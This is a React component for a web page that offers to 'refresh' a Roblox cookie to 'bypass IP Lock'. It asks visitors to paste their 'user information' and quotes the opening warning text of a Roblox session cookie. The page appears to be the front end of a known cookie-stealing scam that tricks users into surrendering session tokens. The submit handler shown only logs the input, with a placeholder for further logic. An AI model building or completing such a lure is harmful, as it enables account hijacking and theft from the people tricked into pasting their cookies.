'use client';

import { useState, useEffect, useRef } from 'react';

export default function RefreshCookie() {
  const [userInfo, setUserInfo] = useState('');
  const canvasRef = useRef<HTMLCanvasElement>(null);

  // Particle animation effect
  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;

    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const particles: Array<{
      x: number;
      y: number;
      size: number;
      opacity: number;
      vx: number;
      vy: number;
    }> = [];

    // Create particles
    for (let i = 0; i < 50; i++) {
      particles.push({
        x: Math.random() * canvas.width,
        y: Math.random() * canvas.height,
        size: Math.random() * 2 + 0.5,
        opacity: Math.random() * 0.5 + 0.2,
        vx: (Math.random() - 0.5) * 0.5,
        vy: (Math.random() - 0.5) * 0.5,
      });
    }

    const animate = () => {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = '#000';
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      particles.forEach((particle) => {
        particle.x += particle.vx;
        particle.y += particle.vy;

        // Wrap around edges
        if (particle.x < 0) particle.x = canvas.width;
        if (particle.x > canvas.width) particle.x = 0;
        if (particle.y < 0) particle.y = canvas.height;
        if (particle.y > canvas.height) particle.y = 0;

        ctx.fillStyle = `rgba(217, 119, 119, ${particle.opacity})`;
        ctx.beginPath();
        ctx.arc(particle.x, particle.y, particle.size, 0, Math.PI * 2);
        ctx.fill();
      });

      requestAnimationFrame(animate);
    };

    animate();

    const handleResize = () => {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    };

    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  const handleRefresh = () => {
    if (userInfo.trim()) {
      console.log('Refreshing with:', userInfo);
      // Add your refresh logic here
    }
  };

  return (
    <div className="relative w-full min-h-screen bg-black flex items-center justify-center overflow-hidden">
      {/* Particle background */}
      <canvas
        ref={canvasRef}
        className="absolute inset-0 pointer-events-none"
      />

      {/* Content */}
      <div className="relative z-10 w-full max-w-xl px-8">
        <div className="space-y-8">
          {/* Header */}
          <div className="text-center space-y-4">
            <h1 className="text-4xl font-bold text-white">Refresh Cookie</h1>
            <p className="text-gray-400 text-lg">
              Refresh ROBLOX cookie to bypass IP Lock.
            </p>
          </div>

          {/* Warning Box */}
          <div className="border border-gray-700 rounded-lg p-4 bg-black/50 flex gap-3">
            <div className="text-2xl flex-shrink-0">⚠️</div>
            <p className="text-gray-500 text-sm leading-relaxed">
              _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-other-people-to-hijack-your-account.
            </p>
          </div>

          {/* User Information Section */}
          <div className="space-y-4">
            <div className="flex items-center gap-2">
              <div className="w-4 h-4 border-2 border-red-500 rounded"></div>
              <label className="text-red-500 font-semibold text-sm uppercase tracking-wide">
                User Information
              </label>
            </div>

            {/* Text Area */}
            <textarea
              value={userInfo}
              onChange={(e) => setUserInfo(e.target.value)}
              placeholder="Paste your user information here..."
              className="w-full h-40 bg-black border border-gray-700 rounded-lg p-4 text-gray-300 placeholder-gray-600 focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500 resize-none"
            />
          </div>

          {/* Refresh Button */}
          <button
            onClick={handleRefresh}
            className="w-full bg-red-500 hover:bg-red-600 text-white font-semibold py-3 px-4 rounded-lg transition-colors duration-200"
          >
            Refresh
          </button>
        </div>
      </div>
    </div>
  );
}
